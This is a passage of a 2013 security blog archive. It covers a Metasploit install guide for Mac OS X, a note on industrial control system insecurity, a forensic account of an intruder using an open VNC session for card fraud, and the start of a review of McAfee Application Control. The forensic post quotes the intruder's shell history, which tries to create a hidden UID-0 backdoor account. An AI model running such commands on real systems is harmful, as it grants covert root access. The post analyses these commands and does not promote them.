<p>So you now have two commands, <code>pg_start</code> and <code>pg_stop</code>, to use for Metasploit.<br />
Finally, we create the msf user that will connect to the database from within Metasploit:</p>
<pre><code>createuser msf -P -h localhost  
createdb -O msf msf -h localhost </code></pre>
<p>While we are at the database stuff, let&#8217;s configure Metasploit to use it. Create a <code>database.yml</code> file in  <code>/usr/local/share/metasploit-framework/config/</code> and put these lines:</p>
<pre>production:
    adapter: postgresql
    database: msf
    username: msf
    password: &lt;password&gt;
    host: 127.0.0.1
    port: 5432
    pool: 75
    timeout: 5</pre>
<p>The database is ready!</p>
<h1>Getting Ruby</h1>
<p>The last big step is to install Ruby. The one provided by Mac Os is a little too old, and you don&#8217;t want to mess with system libraries, so let&#8217;s leave it untouched. You could install Ruby with Homebrew, but it happens that the latest version (2.0.0-p0) is not working with Metasploit (OpenSSL libraries conflicts). So we need to use something like the 1.9.3 version of Ruby.</p>
<p>Anyway, a good practice is to have some flexibility on the version you are going to use, so you would be able to switch between 1.9.3, 2.0.0 or whatever and that whenever you need.</p>
<p>Here comes <strong>rbenv</strong>. For the next steps, I will assume that you have a working homebrew setting.</p>
<p>Let&#8217;s go:</p>
<pre>brew install rbenv ruby-build</pre>
<p>Add this line to your .zshrc or bash_profile:</p>
<pre>eval "$(rbenv init -)"</pre>
<p>Now you should be able to list all installable versions of Ruby:</p>
<pre>rbenv install --list</pre>
<p>Let&#8217;s pick up 1.9.3:</p>
<pre>rbenv install 1.9.3-p392</pre>
<p>It takes a while, but after it is completed, you can set it as your default:</p>
<pre>rbenv rehash
rbenv global 1.9.3-p392</pre>
<p>Note that you could use the <code>local</code> command instead of <code>global</code> to set it for the current terminal only.</p>
<p>Let&#8217;s check that everything is correctly set. This is where the Ruby versions are stored:</p>
<pre>$ ls ~/.rbenv/versions/
1.9.3-p392 2.0.0-p0</pre>
<p><code>ruby</code> and <code>gem</code> MUST point to the 1.9.3 version:</p>
<pre>$ rbenv which ruby
$HOME/.rbenv/versions/1.9.3-p392/bin/ruby
$ rbenv which gem
$HOME/.rbenv/versions/1.9.3-p392/bin/gem</pre>
<p>Looks good, let&#8217;s go ahead.</p>
<p>We are now able to install up the required gems for Metasploit. They made it easy by packaging these in a Gemfile that can be read by the &#8220;bundle&#8221; utility:</p>
<pre>gem install bundle
cd /usr/local/share/metasploit-framework
rbenv rehash
bundle install</pre>
<h1>Final steps</h1>
<p>Create an <code>vncviewer</code> wrapper to facilitate use from within Metasploit:</p>
<pre>echo '#!/usr/bin/env bash'  &gt;&gt; /usr/local/bin/vncviewer   
echo open vnc://\$1 &gt;&gt; /usr/local/bin/vncviewer  
chmod +x /usr/local/bin/vncviewer</pre>
<p>Get and compile the pcaprub library (optional):</p>
<pre>cd /usr/local/share/metasploit-framework/external
git clone <a href="http://github.com/shadowbq/pcaprub.git">http://github.com/shadowbq/pcaprub.git</a>
cd ./ext/pcaprub
ruby extconf.rb &amp;&amp; make &amp;&amp; make install</pre>
<h1>Have fun!</h1>
<p>If you haven&#8217;t, don&#8217;t forget to start Postgres, and you are ready to play:</p>
<pre>sudo -E msfconsole</pre>
<p>It should deploy the database structure and then start to work without warning. Hurrah! That was not hard, but a bit long, wasn&#8217;t it?</p>
<p>In case it still fails for you, it means that something went wrong with the setup. Check the steps again, and then leave a comment as it may be the time for an update or a correction of this article.</p>
<h1>Credits</h1>
<p>As stated in the introduction, this article is mostly taken from <a href="http://www.darkoperator.com/installing-metasploit-in-ubunt/">darkoperator.com</a> with minor adjustments (it actually did not work out of the box for me), so the use of rbenv. I hope it will be helpful to other people in the same case as me.</p>
<p><em><strong>UPDATE 09/07/2013</strong>:</em></p>
<ul>
<li><em>change in pcaprub directory (./pcaprub &#8211;&gt; ./ext/pcaprub)</em></li>
</ul>
<p><em><strong>UPDATE 07/23/2013</strong>:</em></p>
<ul>
<li><em><span style="line-height: 1.714285714; font-size: 1rem;">add missing </span><span style="line-height: 1.714285714; font-size: 1rem;">rbenv rehash command (thanks @</span><span style="line-height: 1.714285714; font-size: 1rem;">amukofes)</span></em></li>
<li><em>add missing commands to retrieve pcaprub (thanks @Ton)</em></li>
<li><em>fix indentation in postgres config file</em></li>
</ul>
<p><!--EndFragment--></p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
			<i class="icon-folder-open-empty"></i> <a href="../../administration-systeme/mac-os.html" rel="category tag">Mac OS</a>, <a href="../pentesting.html" rel="category tag">Pentesting</a>, <a href="../../security.html" rel="category tag">Security</a> <i class="icon-tag"></i> <a href="../../../tag/mac-os-x.html" rel="tag">Mac OS X</a>, <a href="../../../tag/metasploit.html" rel="tag">Metasploit</a>, <a href="../../../tag/rbenv.html" rel="tag">rbenv</a>, <a href="../../../tag/ruby.html" rel="tag">ruby</a>, <a href="../../../tag/zsh.html" rel="tag">zsh</a> <i class="icon-calendar"></i> <a href="../../../2013/05/05/installing-metasploit-on-os-x-mountain-lion.html" title="7:08 pm" rel="bookmark"><time class="entry-date" datetime="2013-05-05T19:08:36+00:00">May 5, 2013</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="../../../author/jc.html" title="View all posts by phocean" rel="author">phocean</a></span></span>.								</footer><!-- .entry-meta -->
	</article><!-- #post -->
	<article id="post-1529" class="post-1529 post type-post status-publish format-standard hentry category-defense category-security tag-ics tag-mestasploit tag-plc tag-scada tag-schneider tag-wincc">
				<header class="entry-header">

						<h1 class="entry-title">
				<a href="../../../2013/02/03/the-evolution-of-ics-security.html" title="Permalink to The evolution of ICS security" rel="bookmark">The evolution of ICS security</a>
			</h1>
								</header><!-- .entry-header -->

				<div class="entry-content">
			<!-- Adds 140x140 featured image to single post view -->
			<div class="excerpt-thumb">
							</div>
			<p>This <a href="http://blog.ptsecurity.com/2013/01/ics-security-analysis-new-pentest-tools.html">article</a>, which comes with nice screencasts, is an interesting state of art on industrial system &#8211; or rather lack of &#8211; security. These systems are popularly known as <strong>SCADA</strong> systems, but SCADA systems are just a subpart of <strong>ICS</strong> (<strong>I</strong>ndustrial <strong>C</strong>ontrol <strong>S</strong>ystems).</p>
<p>Well, there is no surprise that they have been highly insecure from their conception, and that many are exposed on the Internet.</p>
<p>What is interesting is to note the recent evolution:</p>
<ul>
<li><span style="line-height: 14px;">As ICS are getting more media coverage, they are more and more targeted by both security researchers and activists (e.g. Anonymous). The latter is especially scary if you think of what some of them are capable to do for their cause and their degree of amateurism.</span></li>
<li>More and more automatic exploitation tools are developed, making the task of the attacker easier: Metasploit modules, WinCC Harvester, PLCScan&#8230;</li>
<li>Stuxnet was discovered about 3 years ago, but vendors have yet to fix systems and publish security hardening guides (still drafts). I am even talking about end-users awareness&#8230;</li>
</ul>
<p>Conclusion: we are still at the beginning of the ICS insecurity era and we can expect more hack news&#8230;</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
			<i class="icon-folder-open-empty"></i> <a href="../defense.html" rel="category tag">Defense</a>, <a href="../../security.html" rel="category tag">Security</a> <i class="icon-tag"></i> <a href="../../../tag/ics.html" rel="tag">ICS</a>, <a href="../../../tag/mestasploit.html" rel="tag">Mestasploit</a>, <a href="../../../tag/plc.html" rel="tag">PLC</a>, <a href="../../../tag/scada.html" rel="tag">Scada</a>, <a href="../../../tag/schneider.html" rel="tag">schneider</a>, <a href="../../../tag/wincc.html" rel="tag">WinCC</a> <i class="icon-calendar"></i> <a href="../../../2013/02/03/the-evolution-of-ics-security.html" title="1:35 pm" rel="bookmark"><time class="entry-date" datetime="2013-02-03T13:35:40+00:00">February 3, 2013</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="../../../author/jc.html" title="View all posts by phocean" rel="author">phocean</a></span></span>.								</footer><!-- .entry-meta -->
	</article><!-- #post -->
	<article id="post-1474" class="post-1474 post type-post status-publish format-standard hentry category-forensic category-news category-privacy-security category-security tag-firefox tag-forensics tag-hacking tag-scam tag-scammer tag-scamming tag-sqlite">
				<header class="entry-header">

						<h1 class="entry-title">
				<a href="../../../2013/01/20/a-relative-got-hacked-for-scamming-activities.html" title="Permalink to A relative got hacked for scamming activities" rel="bookmark">A relative got hacked for scamming activities</a>
			</h1>
								</header><!-- .entry-header -->

				<div class="entry-content">
			<!-- Adds 140x140 featured image to single post view -->
			<div class="excerpt-thumb">
							</div>
			<p>One of my relative got hacked.</p>
<p>After a phone conversation with him, I realized that his computer was hacked a few days before. He told me that he saw the mouse moving by itself, but what happened then was not clear to him. Anyway, he did not feel the urge to call me immediately. Needless to say that his knowledge on computers is low.<br />
I immediately started to investigate.</p>
<h2>How the computer was hacked</h2>
<p>The computer is running Ubuntu . I suspected a vulnerability, but I soon realized that it was much simpler than that: by mistake, a VNC session was left opened!</p>
<p><em><strong>x11vnc</strong></em> with <strong><em>no authentication</em></strong> and <em><strong>no logging</strong></em>&#8230; Damned!</p>
<h2>What the attacker did</h2>
<p>What he tried first was to create a user to maintain access. But the scammer was probably low tech and soon abandonned.</p>
<p>Here is his sequence in the shell history:</p>
<pre>261 adduser -u 0 -o -g 0 -G 0,1,2,3,4,6,10 -M xxxcx
262 useradd -d /home/xxxcx -m nokia00
263 passwd xxxcx</pre>
<p>Command <strong>#261</strong> failed, because of unproper syntax. I guess he meant useradd, as adduser on Debian/Ubuntu has totally different options. Note that what he was trying to do is create a new root user named xxxcx (with no home directory).</p>
<p>He probably did not realize his mistake, but yet tried this time useradd with fewer options in command <strong>#262</strong>. This time, he would create the home directory and name the user nokia00&#8230; Why not. Alas, the command can&#8217;t work as a standard user!</p>
<p>Then, command <strong>#263</strong>: he tried to change the current password, but again he failed as it is required to know it before updating it&#8230;</p>
<p>And that&#8217;s it. Pretty lame, isn&#8217;t it? He got quickly discouraged and started to use exclusively <em><strong>Firefox</strong></em>.</p>
<h2>On-line shopping</h2>
<p>With support of <a title="forensicswiki.org" href="http://www.forensicswiki.org/wiki/Mozilla_Firefox">forensicswiki.org</a>, I dumped the full Firefox profile on my computer and started to analyze it with the <a title="Sqlite Manager" href="https://addons.mozilla.org/fr/firefox/addon/sqlite-manager/">Sqlite Manager</a> extension.</p>
<blockquote><p>Sorry but I will be hiding private info and sensitive data that could be used for a legal action.</p></blockquote>
<p>I got most info from the files <em><strong>cookies.sqlite</strong></em> and <em><strong>places.sqlite</strong></em>.</p>
<div id="attachment_1482" style="width: 590px" class="wp-caption alignnone"><a href="../../../2013/01/20/a-relative-got-hacked-for-scamming-activities.html/cookies.html" rel="attachment wp-att-1482"><img class="size-medium wp-image-1482" alt="cookies.sqlite: a lot of info: email and billing info used by the attacker" src="../../../wp-content/uploads/2013/01/cookies-580x345.png" width="580" height="345" srcset="/wp-content/uploads/2013/01/cookies-580x345.png 580w, /wp-content/uploads/2013/01/cookies-940x560.png 940w, /wp-content/uploads/2013/01/cookies-500x298.png 500w, /wp-content/uploads/2013/01/cookies.png 1394w" sizes="(max-width: 580px) 100vw, 580px" /></a><p class="wp-caption-text">cookies.sqlite: a lot of info: email and billing info used by the attacker</p></div>
<div id="attachment_1483" style="width: 590px" class="wp-caption alignnone"><a href="../../../2013/01/20/a-relative-got-hacked-for-scamming-activities.html/places.html" rel="attachment wp-att-1483"><img class=" wp-image-1483 " title="places.sqlite" alt="places" src="../../../wp-content/uploads/2013/01/places-580x345.png" width="580" height="345" srcset="/wp-content/uploads/2013/01/places-580x345.png 580w, /wp-content/uploads/2013/01/places-940x560.png 940w, /wp-content/uploads/2013/01/places-500x298.png 500w, /wp-content/uploads/2013/01/places.png 1394w" sizes="(max-width: 580px) 100vw, 580px" /></a><p class="wp-caption-text">places.sqlite: attacker&#8217;s browsing history, with interesting purchase references in GET parameters</p></div>
<p>The guy didn&#8217;t loose time, he knew precisely what he wanted and what to do.</p>
<ol>
<li>He first visited two websites to localize the computer: <a title="ip2location.com" href="http://ip2location.com/">ip2location.com</a> and <a title="ip-tracker.org" href="http://www.ip-tracker.org/">ip-tracker.org</a>. You may think that it is a strange first move, but I will come back on that later as I have a theory.</li>
<li>Now that he knew in what country he was (country XXX), he started to do online shopping.</li>
</ol>
<p>It is interesting that his online shopping was all linked to web hosting:</p>
<ul>
<li>templates from dreamtemplates.com</li>
<li>a .net domain name (with however part of the prefix being localized accordingly to the country suffix).</li>
<li>hosting at netfirms.com and mg1host.com</li>
</ul>
<p>Note that the criminal used a online payment platform that I never heard about before: 2checkout.com aka 2co.com.</p>
<p>Unfortunately, when I investigated, all cookies were expired so I could not connect to the criminal&#8217;s account.</p>
<p>Yet, it still had some valuable info. The most interesting info I found was from a cookie from dreamtemplates.com. I got all the billing info used by the attacker:</p>
<ul>
<li>attacker&#8217;s gmail address (probably compromised or anonymous)</li>
<li>Name and address for the billing, that sounded real&#8230;</li>
</ul>
<p>Also, GET parameters in URLs were very interesting.</p>
<p>In some of them, you can guess the amount of the purchase he did. He for sure bought stuff for at least a total of 500$. But it is without counting the stuff that I cannot guess from URLs, so it is probably sensibly much more in reality.</p>
<p>But, even better, some had order ids. Hey, wait! Let&#8217;s have a look on the 2co website:</p>
<div id="attachment_1487" style="width: 474px" class="wp-caption alignnone"><a href="../../../2013/01/20/a-relative-got-hacked-for-scamming-activities.html/2co_order_review.html" rel="attachment wp-att-1487"><img class=" wp-image-1487 " alt="2co order review = order number + email" src="../../../wp-content/uploads/2013/01/2co_order_review-580x362.png" width="464" height="290" srcset="/wp-content/uploads/2013/01/2co_order_review-580x362.png 580w, /wp-content/uploads/2013/01/2co_order_review-480x300.png 480w, /wp-content/uploads/2013/01/2co_order_review.png 781w" sizes="(max-width: 464px) 100vw, 464px" /></a><p class="wp-caption-text">2co order review = order number + email</p></div>
<p>Hmmm&#8230; we have the email address and the order number&#8230; bingo!</p>
<p><a href="../../../2013/01/20/a-relative-got-hacked-for-scamming-activities.html/order.html" rel="attachment wp-att-1488"><img class="alignnone  wp-image-1488" alt="order" src="../../../wp-content/uploads/2013/01/order-580x911.png" width="406" height="638" srcset="/wp-content/uploads/2013/01/order-580x911.png 580w, /wp-content/uploads/2013/01/order-190x300.png 190w, /wp-content/uploads/2013/01/order.png 676w" sizes="(max-width: 406px) 100vw, 406px" /></a></p>
<p>Now, we have at least all info of the credit card owner, certainly the biggest victim in this mess.</p>
<h2>Conclusion</h2>
<p>That&#8217;s it for now. We are still in the process of transmitting the info to the police and alerting the victim.</p>
<p>Here are a few thoughts by the way:</p>
<ul>
<li>Logging, always logging! It is a pity that we know literally nothing about the scammer source ip address. All his actions were made from within a VNC session and it leaves no trace. He may have came from another proxy, but who knows&#8230; I still have a little hope that under legal request, the Internet provider of my relative will be able to provide some logs.</li>
</ul>
<ul>
<li>Nowadays, it is still difficult to report such a case to the police and to help the victim. The local police is at loss and does not really know what to do. The cyber section is slow to answer, probably crawling under requests (mostly spam stuff?).</li>
</ul>
<ul>
<li>Not every one has a computer specialist among friends or relatives. It must be a terrible experience to see the police coming to you for a fraud one hasn&#8217;t committed directly. Few people, even sometimes among IT professionals, understand that.</li>
</ul>
<ul>
<li>The criminal seemed low tech, but very organized at the same time.<br />
Here is my theory: he probably has a precise goal and is not loosing time.<br />
He follows a process: geo-localize the victim or target a country and choose accordingly financial data in his database.<br />
Then, he purchases stuff from a list of items he needs or he is requested.<br />
Finally, if he could not find a way to maintain access in seconds, he leaves. Mission done: this scammer is probably doing it full time, as a professional activity. Lame but efficient for the crime industry.</li>
</ul>
<ul>
<li>The credit card info was accompanied with private info: real name and address. We all know that but it is always shocking to think how it can easily obtained: compromised computer, hacked online shop or database, dishonest employee (e.g. at the hotel), etc.</li>
</ul>
<ul>
<li>The websites  will probably be used for more scamming and illegal activities. I am going to monitor the domain I got for a while.</li>
</ul>
<p>Keep wired for updates.</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
			<i class="icon-folder-open-empty"></i> <a href="../forensic.html" rel="category tag">Forensic</a>, <a href="../../news.html" rel="category tag">News</a>, <a href="../privacy-security.html" rel="category tag">Privacy</a>, <a href="../../security.html" rel="category tag">Security</a> <i class="icon-tag"></i> <a href="../../../tag/firefox.html" rel="tag">firefox</a>, <a href="../../../tag/forensics.html" rel="tag">Forensics</a>, <a href="../../../tag/hacking.html" rel="tag">Hacking</a>, <a href="../../../tag/scam.html" rel="tag">scam</a>, <a href="../../../tag/scammer.html" rel="tag">scammer</a>, <a href="../../../tag/scamming.html" rel="tag">scamming</a>, <a href="../../../tag/sqlite.html" rel="tag">sqlite</a> <i class="icon-calendar"></i> <a href="../../../2013/01/20/a-relative-got-hacked-for-scamming-activities.html" title="5:40 pm" rel="bookmark"><time class="entry-date" datetime="2013-01-20T17:40:03+00:00">January 20, 2013</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="../../../author/jc.html" title="View all posts by phocean" rel="author">phocean</a></span></span>.								</footer><!-- .entry-meta -->
	</article><!-- #post -->
	<article id="post-1394" class="post-1394 post type-post status-publish format-standard hentry category-defense category-reversing category-security category-vulnerabilities tag-application-control tag-asm tag-assembly tag-backtrack tag-buffer-overflow tag-hardening tag-heap tag-mcafee tag-metasploit tag-ollydbg tag-sha-1 tag-solidcore tag-stack tag-windbg">
				<header class="entry-header">

						<h1 class="entry-title">
				<a href="../../../2012/12/14/review-of-mcafee-application-control-ex-solidcore-the-ultimate-solution-to-patching.html" title="Permalink to Review of McAfee Application Control (ex-SolidCore): the ultimate solution to patching?" rel="bookmark">Review of McAfee Application Control (ex-SolidCore): the ultimate solution to patching?</a>
			</h1>
								</header><!-- .entry-header -->

				<div class="entry-content">
			<!-- Adds 140x140 featured image to single post view -->
			<div class="excerpt-thumb">
							</div>
			<h1>What is McAfee Application Control</h1>
<p>I had the opportunity to review this security software, and I want to share here the results of my tests.</p>
<p>McAfee bought the SolidCore solution and renamed it into <a title="McAfee Application Control" href="http://www.mcafee.com/us/products/application-control.aspx#vt=vtab-Benefits">McAfee Application Control </a>(along with other features). For convenience, we will keep referring the solution as SolidCore.</p>
<p>In a few words, this tool falls into the category of white-listing defense systems. It hardens a Windows system by fingerprinting all executables files of the disk drive and enforcing access control based on this hash. Somehow a sort of Tripwire but with access control and attack detection.</p>
<p>The problem is that McAfee claims that the solution will protect unpatched systems. Such a claim is appealing, because in real life it is not always easy to patch systems in production. Beyond technical considerations, there is always business and management constraints. The solution of McAfee is supposed to prevent vulnerabilities to be triggered thanks to the memory protection features. Look on their website, they say it loudly: &#8220;you can delay patching and it protects from buffer overflows&#8221;.</p>
<div id="attachment_1450" style="width: 594px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/SolidCore-commercial_sheet.png" rel="lightbox[1394]"><img class="size-large wp-image-1450" title="SolidCore-commercial_sheet" alt="" src="../../../wp-content/uploads/2012/12/SolidCore-commercial_sheet-940x929.png" width="584" height="577" srcset="/wp-content/uploads/2012/12/SolidCore-commercial_sheet-940x929.png 940w, /wp-content/uploads/2012/12/SolidCore-commercial_sheet-580x573.png 580w, /wp-content/uploads/2012/12/SolidCore-commercial_sheet-303x300.png 303w, /wp-content/uploads/2012/12/SolidCore-commercial_sheet-120x120.png 120w, /wp-content/uploads/2012/12/SolidCore-commercial_sheet.png 1106w" sizes="(max-width: 584px) 100vw, 584px" /></a><p class="wp-caption-text">MacAfee Application Control commercial sheet</p></div>
<p>Really? When you check more thoroughly, you find that the solution operates only in user-mode, leaving all kernel-mode issues on the side. Already, any security specialist should become suspicious and think about the numerous limitations it implies&#8230;</p>
<p>Anyway, such a statement deserves serious testing. Here we go.</p>
<h1>Testing Lab</h1>
<p>The testing environment is composed of:</p>
<ul>
<li>a Windows XP SP1 virtual machine (no patch),</li>
<li>a Windows XP SP1 virtual machine (no patch) with SolidCore installed and enabled,</li>
<li>a Windows virtual machine running WinDBG for kernel debugging,</li>
<li>a Linux virtual machine running Metasploit (Backtrack),</li>
<li>a few vulnerable programs: aurora.html for heap overflows and two executables vulnerable against buffer overflow,</li>
<li>OllyDbg on both machines to observe the exploitation process.</li>
</ul>
<p>The point is simple: test some vulnerabilities against unpatched systems, with and without SolidCore, and compare the results.</p>
<blockquote><p>The purpose here is only to focus on what SolidCore is doing (though we are not going to attempt to reverse the application). I will not get here into explanations on assembly and memory exploitation, so please refer to the many great tutorials that can be found on the Internet.</p>
<p>As mentioned, I am myself a noob in reversing and shellcoding so please drop a comment if you see something wrong.</p></blockquote>
<h1>Installing SolidCore</h1>
<p>Like Tripwire, SolidCore needs to take an image of the system when it is sane.</p>
<p>So, basically, after setting it, there are a few commands to type into a command window to scan the whole disk:</p>
<pre>sadmin so
sadmin enable</pre>
<p>It will look for executables (.exe, .dll, etc.) and build a database using SHA-1 hashes.</p>
<div id="attachment_1406" style="width: 590px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/SolidCore_activation.png" rel="lightbox[1394]"><img class="size-medium wp-image-1406" title="SolidCore_activation" alt="SolidCore Activation" src="../../../wp-content/uploads/2012/12/SolidCore_activation-580x413.png" width="580" height="413" srcset="/wp-content/uploads/2012/12/SolidCore_activation-580x413.png 580w, /wp-content/uploads/2012/12/SolidCore_activation-420x300.png 420w, /wp-content/uploads/2012/12/SolidCore_activation.png 933w" sizes="(max-width: 580px) 100vw, 580px" /></a><p class="wp-caption-text">SolidCore commands and status after activation</p></div>
<p>Now, only applications installed before the scan will be allowed. If you drop a new file or move an existing one to a new patch and try to execute it, it will fail like this:</p>
<div id="attachment_1409" style="width: 590px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/SolidCore_blocking_execution.png" rel="lightbox[1394]"><img class="size-medium wp-image-1409" title="SolidCore_blocking_execution" alt="SolidCore blocking execution of a program" src="../../../wp-content/uploads/2012/12/SolidCore_blocking_execution-580x317.png" width="580" height="317" srcset="/wp-content/uploads/2012/12/SolidCore_blocking_execution-580x317.png 580w, /wp-content/uploads/2012/12/SolidCore_blocking_execution-500x273.png 500w, /wp-content/uploads/2012/12/SolidCore_blocking_execution.png 787w" sizes="(max-width: 580px) 100vw, 580px" /></a><p class="wp-caption-text">SolidCore blocks the execution of a new executable file</p></div>
<p>After that, whenever you need to install a new application, you have to go through the &#8220;update mode&#8221;. Just enter:</p>
<pre>sadmin bu</pre>
<p>At this moment, the protection is deactivated and you can execute anything. Then, you need to do a new scan and re-enable the protection as done previously.</p>
<p>Also, not all memory protections are activated by default. This is supposed to enable memory randomization (aka ALSR but McAfee made):</p>
<pre>sadmin features enable mp-vasr</pre>
<p>Now, see the enabled features:</p>
<div id="attachment_1412" style="width: 444px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/SolidCore_features_list.png" rel="lightbox[1394]"><img class="size-full wp-image-1412" title="SolidCore_features_list" alt="SolidCore features list" src="../../../wp-content/uploads/2012/12/SolidCore_features_list.png" width="434" height="178" /></a><p class="wp-caption-text">SolidCore features list and memory protection (mp-vasr, mp-casp)</p></div>
<p>So far so good, now we can play!</p>
<h1>Let&#8217;s see what is behind the scene&#8230;</h1>
<p>The first thing to notice is that SolidCore installs a service launched with the LocalSystem account.</p>
<div id="attachment_1415" style="width: 594px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/SolidCore_service1.png" rel="lightbox[1394]"><img class="size-large wp-image-1415" title="SolidCore_service1" alt="SolidCore service" src="../../../wp-content/uploads/2012/12/SolidCore_service1-940x562.png" width="584" height="349" srcset="/wp-content/uploads/2012/12/SolidCore_service1-940x562.png 940w, /wp-content/uploads/2012/12/SolidCore_service1-580x346.png 580w, /wp-content/uploads/2012/12/SolidCore_service1-500x300.png 500w, /wp-content/uploads/2012/12/SolidCore_service1.png 983w" sizes="(max-width: 584px) 100vw, 584px" /></a><p class="wp-caption-text">SolidCore service</p></div>
<div id="attachment_1416" style="width: 336px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/SolidCore_service2.png" rel="lightbox[1394]"><img class=" wp-image-1416 " title="SolidCore_service2" alt="SolidCore background service process" src="../../../wp-content/uploads/2012/12/SolidCore_service2.png" width="326" height="365" srcset="/wp-content/uploads/2012/12/SolidCore_service2.png 408w, /wp-content/uploads/2012/12/SolidCore_service2-268x300.png 268w" sizes="(max-width: 326px) 100vw, 326px" /></a><p class="wp-caption-text">SolidCore background service process</p></div>
<p>Let&#8217;s have a look within a kernel debugging session with WinDbg.</p>
<p>While booting, the target displays a lot of interesting info concerning the McAfee solution:</p>
<pre>Solidcore log buf: F8418B60, F84415C0
K.0004.0008: Nov 30 2012:04:49:09.812: SYSTEM: rtinit.c : 1474: McAfee Solidifier driver version 6.0.1-9049
K.0004.0008: Nov 30 2012:04:49:09.828: SYSTEM: rtinit.c : 1476: DriverEntry @F846E500
K.0004.0028: Nov 30 2012:04:49:10.093: SYSTEM: imgp_rebase.c: 196: <strong>Rebased \Device\HarddiskVolume1\WINDOWS\system32\ntdll.dll to \Device\HarddiskVolume1\Solidcore\vasr\ntdll.dll at 0x5cda0000.</strong>
K.0004.0028: Nov 30 2012:04:49:10.500: SYSTEM: rtinit.c : 129: Booting up with RTEMode = 1
[...]
K.0432.0436: Nov 30 2012:04:49:15.671: ERROR: cap_kern.c : 1106: Failed to compute checksum for '\Device\HarddiskVolume1\WINDOWS\system32\autochk.exe'. err = 1099
K.0432.0436: Nov 30 2012:04:49:15.796: SYSTEM: imgp_rebase.c: 196: <strong>Rebased \Device\HarddiskVolume1\WINDOWS\system32\kernel32.dll to \Device\HarddiskVolume1\Solidcore\vasr\kernel32.dll at 0x65d60000.</strong>
K.0432.0436: Nov 30 2012:04:49:15.828: SYSTEM: imgp.c : 3114: Starting decoying of \Device\HarddiskVolume1\Solidcore\vasr\kernel32.dll (\Device\HarddiskVolume1\Solidcore\k32_c__v.dll)
K.0432.0436: Nov 30 2012:04:49:15.890: SYSTEM: imgp.c : 3118: Finished decoying of \Device\HarddiskVolume1\Solidcore\vasr\kernel32.dll (\Device\HarddiskVolume1\Solidcore\k32_c__v.dll) with err = 0
K.0432.0436: Nov 30 2012:04:49:15.953: SYSTEM: imgp_rebase.c: 196: <strong>Rebased \Device\HarddiskVolume1\WINDOWS\system32\user32.dll to \Device\HarddiskVolume1\Solidcore\vasr\user32.dll at 0x48c60000.</strong>
K.0732.0828: Nov 30 2012:04:49:20.859: SYSTEM: utl.c : 500: Failed to find username, err 0xc000020c, perhaps the service is not running.
K.1312.1316: Nov 30 2012:04:49:21.281: SYSTEM: pkgc_misc.c : 679: <strong>Rebased \Device\HarddiskVolume1\Solidcore\pkgc\10980000\Device\HarddiskVolume1\WINDOWS\system32\_si.dll to 10980000</strong>
K.1312.1316: Nov 30 2012:04:49:21.390: ERROR: imgp.c : 3190: 0001 Failed to set branch target 0x10c46740 from 0x00000000 at VA 0x10a56760.
K.0732.0828: Nov 30 2012:04:49:23.875: SYSTEM: utl.c : 520: Retrying usermode lookup of username [1].
K.0732.0828: Nov 30 2012:04:49:23.890: SYSTEM: utl.c : 476: Found username as WINXP-MCAFEE\phocean
K.1904.1932: Nov 30 2012:04:49:27.078: SYSTEM: pkgc_misc.c : 679: <strong>Rebased \Device\HarddiskVolume1\Solidcore\pkgc\20170000\Device\HarddiskVolume1\WINDOWS\system32\_si.dll to 20170000</strong>
K.1904.1932: Nov 30 2012:04:49:27.453: ERROR: imgp.c : 3190: 0002 Failed to set branch targ et 0x20436740 from 0x00000000 at VA 0x20246760.
[...]</pre>
<p>We learn the driver entry point and that it is relocating a few strategic DLL: ntdll, kernel32, user32 and _si.dll. Ntdll, kernel32 and user32 are obviously the main user-mode API of Windows and we can expect that SolidCore is also putting a few hooks inside them. _si.dll is part of SolidCore and appear to be unlinked while the system is running.</p>
<p>Let&#8217;s look around modules to confirm the position fo the driver:</p>
<div id="attachment_1418" style="width: 594px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/SolidCore_driver.png" rel="lightbox[1394]"><img class="size-large wp-image-1418" title="SolidCore_driver" alt="SolidCore driver" src="../../../wp-content/uploads/2012/12/SolidCore_driver-940x815.png" width="584" height="506" srcset="/wp-content/uploads/2012/12/SolidCore_driver-940x815.png 940w, /wp-content/uploads/2012/12/SolidCore_driver-580x503.png 580w, /wp-content/uploads/2012/12/SolidCore_driver-345x300.png 345w, /wp-content/uploads/2012/12/SolidCore_driver.png 945w" sizes="(max-width: 584px) 100vw, 584px" /></a><p class="wp-caption-text">SolidCore driver (WinDbg kernel debugging)</p></div>
<p>So, the McAfee driver is named <em><strong>swin</strong></em>. Quickly looking around, we also find that a DLL is injected in all processes: <strong><em>scinject.dll</em></strong>. Also, see on the screenshot, how <em><strong>kernel32</strong></em> was effectively relocated. So every time the machine will start, the library will be located at a different address (it could be interesting to check the entropy of this randomization, by the way, but this is another topic).</p>
<div id="attachment_1432" style="width: 466px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/McAfee_SolidCore-DLL_injection.png" rel="lightbox[1394]"><img class=" wp-image-1432 " title="McAfee_SolidCore-DLL_injection" alt="McAfee SolidCore, injection of scinject.dll in processes" src="../../../wp-content/uploads/2012/12/McAfee_SolidCore-DLL_injection.png" width="456" height="367" srcset="/wp-content/uploads/2012/12/McAfee_SolidCore-DLL_injection.png 570w, /wp-content/uploads/2012/12/McAfee_SolidCore-DLL_injection-372x300.png 372w" sizes="(max-width: 456px) 100vw, 456px" /></a><p class="wp-caption-text">McAfee SolidCore injects the DLL &#8220;scinject.dll&#8221; in running processes.</p></div>
<p>Just to make sure, I checked that the dll does not get injected by the registry setting:</p>
